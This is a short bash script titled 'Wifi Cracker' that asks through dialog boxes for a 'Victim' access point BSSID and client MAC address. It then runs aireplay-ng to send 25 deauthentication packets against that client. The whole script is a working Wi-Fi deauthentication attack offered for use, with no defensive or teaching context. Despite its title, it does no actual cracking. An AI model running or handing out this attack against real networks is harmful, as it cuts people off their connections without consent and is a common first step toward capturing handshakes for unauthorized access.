
#!/bin/bash
echo "----------------"
echo "- Wifi Cracker -"
echo "----------------"
echo " "
sleep 10
echo " Enter the BSSID of the Victim: "
BSSID1=$(yad --center --width=250 --title "Alert" --buttons-layout=center --text="Enter The BSSID of the Victim: " --entry )
echo " "
echo " Enter the MAC addr of the Victim Station: "
sid=$(yad --center --width=250 --title "Alert" --buttons-layout=center --text="Enter The BSSID of the Victim Station: " --entry )
aireplay-ng --deauth 25 -a "$BSSID1" -c "$sid" wlan0mon
echo " "
echo " Sent 25 deauth packets to the router "
sleep 5
exit
